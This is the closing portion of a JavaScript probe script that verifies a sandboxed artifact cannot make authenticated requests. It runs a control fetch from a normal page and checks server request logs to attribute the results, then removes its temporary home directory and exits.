      return { status: res.status, body: await res.json() };
    });
    expect(
      controlFetch.body?.user != null,
      'control: credentialed fetch from a normal (non-sandboxed) page IS authenticated ' +
        '(proves the echo route + cookie auth work, so arm 3\'s rejection -- when observed -- is ' +
        'attributable to the sandbox boundary, not a broken route)',
      JSON.stringify(controlFetch),
    );

    // Server-side attribution for arm 3 (connect wall): the SAME
    // requestLog now shows EXACTLY ONE request to /api/auth/me across
    // the whole probe window -- and by construction it can only be this
    // control fetch, since the sandboxed artifact's window (checked
    // above, before this control ran) recorded zero. The zero-then-one
    // sequence is what attributes the one entry to the control rather
    // than the sandbox, and rules out "logging silently broke" or
    // "wrong route name" as a false-pass cause for arm 3's zero-count.
    const authMeRequestsAfterControl = requestLog.filter((r) => r.pathname === '/api/auth/me');
    expect(
      authMeRequestsAfterControl.length === 1,
      'arm 3 (connect wall) attribution: server recorded EXACTLY ONE request to /api/auth/me across the ' +
        "whole probe window, attributable to this control fetch (not the sandboxed artifact's)",
      `observed ${authMeRequestsAfterControl.length} request(s): ${JSON.stringify(authMeRequestsAfterControl)}`,
    );
    await controlPage.close();
  } finally {
    await browser.close();
  }

  console.log();
  if (failures.length > 0) {
    console.error(`FAILED: ${failures.length} assertion(s) failed`);
    if (infoLines.length > 0) {
      console.error(`(${infoLines.length} informational note(s) above, see INFO lines)`);
    }
    cleanupAndExit(disposableHome, 1);
  }
  console.log(
    `PASSED: ${passes} assertion(s) passed` +
      (infoLines.length > 0 ? ` (${infoLines.length} informational note(s), see INFO lines above)` : ''),
  );
  cleanupAndExit(disposableHome, 0);
}

/**
 * Remove the disposable AGENT_CONSOLE_HOME tree (never rm -rf per the
 * sandbox guard's convention) and exit.
 *
 * This is a best-effort shutdown of the disposable server + DB handle: there
 * is no exported shutdown hook reachable from here (index.ts's `appContext`
 * is module-private), so this script exits the whole process instead of
 * trying to tear the in-process server down gracefully in place --
 * acceptable for a short-lived, disposable, single-run smoke script.
 */
function cleanupAndExit(disposableHome, code) {
  try {
    rmSync(disposableHome, { recursive: true, force: true });
    console.log(`==> cleaned up disposable AGENT_CONSOLE_HOME: ${disposableHome}`);
  } catch (err) {
    console.error(`==> WARNING: failed to clean up ${disposableHome}: ${err}`);
  }
  process.exit(code);
}

main().catch((err) => {
  console.error(`PROBE FAILED: ${err instanceof Error ? (err.stack ?? err.message) : String(err)}`);
  if (disposableHomeForCleanup) {
    cleanupAndExit(disposableHomeForCleanup, 2);
  } else {
    process.exit(2);
  }
});
